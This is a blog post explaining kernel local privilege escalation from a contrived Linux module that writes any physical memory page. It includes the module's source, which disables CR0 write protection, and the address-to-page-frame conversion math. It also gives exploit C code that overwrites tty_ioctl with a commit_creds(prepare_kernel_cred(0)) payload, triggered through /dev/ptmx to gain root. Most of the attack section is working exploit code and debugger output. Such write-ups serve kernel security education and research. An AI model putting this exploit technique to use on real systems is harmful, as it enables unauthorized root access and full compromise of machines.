---
layout: post
title: "From Linux kernel page exploration to local privilege escalation"
date: 2021-02-26
comments: true
---

# Context

Saying that a Linux kernel module allows a user to write at any physical page number.
Whether this is a bug or a feature, how do you get code execution with this primitive?
This scenario would be incredible in real-life, but the question is legitimate, I think.

# Module description

This is a classic `read/write/lseek` module. The major feature of this module is that we can read/write an entire
`physical memory page frame`. The max size of the write buffer is of course `PAGE_SIZE`, which is `4096` on x64.
We can set the read/write address with lseek **but** when reading/writing after lseeking, the module performs
`pfn_to_page(offset/PAGE_SIZE)`. 

Since nothing is more relevant than code, let's say that we have:
```c
static loff_t manipmem_lseek(struct file *filp, loff_t off, int whence)
{
  loff_t newpos;
  switch(whence) {
  case 0:
    newpos = off;
    break;
   
  case 1: /* SEEK_CUR */
    newpos = offset + off;
    break;
 
  default: /* can't happen */
    return -EINVAL;
  }
  if (newpos < 0) return -EINVAL;
  offset = newpos;
  return newpos;
}
 
static ssize_t manipmem_read(struct file *f, char __user *buf, size_t len, loff_t *off)
{
  int pagedeb;
  int nbpages;
  int i,j,k;
  struct page * p;
  char * v;
 
  pagedeb=offset/PAGE_SIZE;
  nbpages = len/PAGE_SIZE;
 
  j=0;
  for (i=pagedeb;i<(pagedeb+nbpages);i++) {
    p = pfn_to_page(i);
    v = kmap(p);
   
    for (k=0;k<PAGE_SIZE;k++) buf[j++]=v[k];
    kunmap(p);
  }
  offset=offset+nbpages*PAGE_SIZE;
  return(nbpages*PAGE_SIZE);
}
 
static ssize_t manipmem_write(struct file *f, const char __user *buf,size_t len, loff_t *off)
{
  int pagedeb;
  int nbpages;
  int i,j,k;
  struct page * p;
  char * v;
  // we can write only page by page
  pagedeb=offset/PAGE_SIZE;
  nbpages = len/PAGE_SIZE;
  j=0;
  asm("push %rax\n\t"
      "mov %cr0,%rax\n\t"
      "and $0xfffeffff,%eax\n\t"
      "mov %rax,%cr0\n\t"
      "pop %rax\n\t");
  for (i=pagedeb;i<(pagedeb+nbpages);i++) {
    p = pfn_to_page(i);
    v = kmap(p);
    for (k=0;k<PAGE_SIZE;k++) v[k]=buf[j++];
    kunmap(p);
  asm("push %rax\n\t"
      "mov %cr0,%rax\n\t"
      "or $0x10000,%eax\n\t"
      "mov %rax,%cr0\n\t"
      "pop %rax\n\t");
  }
 
  return(nbpages*PAGE_SIZE);
}
```

A bit of documentation is needed now:
```
All the memory models track the status of physical page frames using struct page arranged in one or more arrays.
Regardless of the selected memory model, there exists one-to-one mapping between the physical page frame number (PFN) 
and the corresponding struct page. Each memory model defines pfn_to_page() and page_to_pfn() helpers that allow the 
conversion from PFN to struct page and vice versa.
```

To be short, the read/write functions convert the offset variable content, which is expected to be 
a `page frame number`, to a `kernel virtual memory address`, which the kernel can dereference.

In a classic exploitation scenario, an attacker would like to write at a chosen kernel virtual address, in order to 
overwrite a kernel stack return address, a function pointer or whatever.
So, to write at the address we want, we need to:
- get the page frame number of our target kernel virtual address
- give this page number to lseek
- call write with the appropriate payload and the corresponding length.

The core of the problem is now clear, only the first step concept is blurred, how to convert a 
virtual memory address to a page frame number?

# Converting virtual address to page frame number

## Physical address to page frame number

While studying the physical memory chapter in the 
[kernel documentation](https://www.kernel.org/doc/gorman/html/understand/understand005.html),
you may notice:
```
A PFN is simply in index within physical memory that is counted in page-sized units. PFN for a physical address could 
be trivially defined as (page_phys_addr >> PAGE_SHIFT);
```

Knowing that `PAGE_SHIFT` if a constant, well-defined for each architecture, with `pfn = page_phys_addr >> PAGE_SHIFT`, 
we could easily turn a page physical address, into a page frame number. As we know, dealing with virtual memory
addresses is much more convenient. I don't event know if it's possible to leak or directly read a physical address. Anyway.
The final step is finding how to get the physical address of a virtual address.

## Virtual address to physical address

While studying the page table management chapter in the 
[kernel documentation](https://www.kernel.org/doc/gorman/html/understand/understand006.html),
you may notice:
```c
As we saw in Section 3.6, Linux sets up a direct mapping from the physical address 0 to the virtual address PAGE_OFFSET 
at 3GiB on the x86. This means that any virtual address can be translated to the physical address by simply subtracting 
PAGE_OFFSET which is essentially what the function virt_to_phys() with the macro __pa() does:

/* from <asm-i386/page.h> */
132 #define __pa(x)                 ((unsigned long)(x)-PAGE_OFFSET)

/* from <asm-i386/io.h> */
 76 static inline unsigned long virt_to_phys(volatile void * address)
 77 {
 78         return __pa(address);
 79 }
```

Knowing that `PAGE_OFFSET` is a constant well-defined, well-defined for each architecture, with 
`physical_address = kernel_virtual_address - PAGE_OFFSET`, we have everything we needed to know.

## All things together

The attack scenario would be now:
- find a kernel virtual address where we would like to read and/or write, with the appropriate content to get 
  code execution
- convert the virtual address into a page frame number
- call lseek with an offset argument of calculated pfn (multiplied by PAGE_SIZE since write/read call pfn_to_page(offset/PAGE_SIZE), 
  but that's a detail). If we understood the kernel documentation properly, we have 
  `pfn = (virt_address - PAGE_OFFSET) >> PAGE_SHIFT`.   
- call write with our crafted payload, to overwrite to page where our target virtual address is. Reminds you that we can only
overwrite the whole page, starting from its start address.
  
For information, on x64 `PAGE_OFFSET=0xffffffff80000000` and `PAGE_SHIFT=12`.
  
# Getting code execution

N.B.: every following virtual addresses come from /proc/kallsyms. We could say that this symbol lookup is doable.

## Finding a target

In this example, KASLR is off. Furthermore, SMAP is disabled, but with such a powerful primitive, leaking
kernel-land information to break KASLR and overwriting structure in memory would not be too hard.

Several techniques could be used to get code execution like function pointer overwrite, or kernel stack return 
address overwrite, but I think that this would require too much work to locate what we want in memory. 

Using classic kernel symbols is easier. Instead of overwriting a function pointer and redirecting execution flow, can we
overwrite an entire function frame? Of course yes. So the plan is actually easy: `finding a kernel function that is
called at a guessable moment, overwriting its whole frame with a LPE shellcode, and triggering it.`

## Overwriting tty_release, kind of

Overwriting the classic `tty_release` function is what comes to mind first: `int pwn = open("/dev/ptmx", 'r'); close(pwn);`
and the function is called. So, we find the function address, let's say `0xffffffff813ee0a0`. We can try:
```c
lseek(fd, ((0xffffffff813ee0a0 - PAGE_OFFSET) >> PAGE_SHIFT) * PAGE_SIZE, SEEK_SET);
char b[PAGE_SIZE] = {0};
memset(b, 0x41, PAGE_SIZE);
write(fd, b, PAGE_SIZE);

int pwn = open("/dev/ptmx", 'r');
close(pwn);
```

The close() call crashes the kernel indeed in trying to execute a bunch of 0x41. But the crash does not actually 
appear in tty_release as expected, but in `tty_ioctl`. So this function seems to be called before tty_release. Whatever, 
let's overwrite tty_ioctl.

# Replacing tty_ioctl frame with a LPE function frame

First, it is necessary to ensure that it is truly
the tty_release function frame that starts at 0xffffffff813ee0a0, and not another pointer, otherwise the shellcode would be
significantly different. So we dump the kernel binary and read at address 0xffffffff813ee0a0:

```
(gdb) x/10gi 0xffffffff813ee0a0
   0xffffffff813ee0a0:	push   rbp
   0xffffffff813ee0a1:	mov    rdx,0xffffffff81a67880
   0xffffffff813ee0a8:	mov    rbp,rsp
   0xffffffff813ee0ab:	push   r15
   0xffffffff813ee0ad:	push   r14
   0xffffffff813ee0af:	push   r13
   0xffffffff813ee0b1:	push   r12
   0xffffffff813ee0b3:	mov    r12,rsi
   0xffffffff813ee0b6:	push   rbx
   0xffffffff813ee0b7:	sub    rsp,0x30
   ...
```

This is function prologue, so this address is used in a `call 0xffffffff813ee0a0` in kernel space, `this will transfer 
control to the target address, and begin execution there. So, overwriting the tty_ioctl frame with another one will be 
how we get code execution.`
The classic `commit_creds(prepare_kernel_cred(0))` should work.

```c
#define COMMIT_CREDS 0xffffffff8107ab70LL
#define PREPARE_KERNEL_CRED 0xffffffff8107af00LL
int __attribute__((regparm(3))) kernel_payload() {
  _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
  _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
  commit_creds(prepare_kernel_cred(0));
  return -1;
}
```

Something is important here, the overwrite function signature has to match the one that we overwrite. The overwrite has 
respect the stack layout. Furthermore, `the function has to return -1`.

## Frame overwriting

As a reminder, the size of a memory page on x64 is 4096 = 0x1000. Applied to the overwriting target page, we can find that 
the start address of the page we overwrite is `0xffffffff813ee0a0 ^ (0xffffffff813ee0a0 & 0xFFF) = 0xffffffff813ee000`
, and the end address is `0xffffffff813ee000 + 0xFFF`. Logically, it comes that the target function is located at offset
`0xffffffff813ee0a0 & 0xFFF = 0x0a0` in the page. So, the buffer given to the write function will be constructed of
0xa0 first junk bytes, from index 0 to 0x9F. At 0xa0, we copy the function frame of the privilege escalation payload.
What comes between the end of the function frame, and the end of the page does not matter.

As a result, the exploit function looks like
```c
#define PAGE_SIZE 4096
#define PAGE_OFFSET 0xffffffff80000000LL
#define PAGE_SHIFT 12
#define SHELLCODE_LENGTH 0x3d

#define TTY_IOCTL 0xffffffff813ee8f0LL
#define COMMIT_CREDS 0xffffffff8107ab70LL
#define PREPARE_KERNEL_CRED 0xffffffff8107af00LL

int __attribute__((regparm(3))) kernel_payload() {
  _commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
  _prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
  commit_creds(prepare_kernel_cred(0));
  return -1;
}

void exploit(int fd)
{
  unsigned int target_page = (TTY_IOCTL - PAGE_OFFSET) >> PAGE_SHIFT;
  unsigned int target_offset = TTY_IOCTL & 0xfffLL;

  char *b = (char*) malloc(PAGE_SIZE);
  if (b == NULL)
    exit(EXIT_FAILURE);
    
  memset(b, 0x90, target_offset); // 0x90 for eventual nop slide, but not necessary
  memcpy(b + target_offset, kernel_payload, SHELLCODE_LENGTH);
  
  printf("[+] Offset set at page number 0x%x\n", target_page);
  lseek(fd, target_page*PAGE_SIZE, SEEK_SET); 
  
  printf("[+] Overwriting tty_ioctl with lpe payload\n");
  write(fd, b, PAGE_SIZE);
  
  free(b);
}
```

## Finally

Once this function is written in memory, it only remains to call it with a classic 
`int pwn = open("/dev/ptmx", 'r'); close(pwn);`, and you should be root. :^)







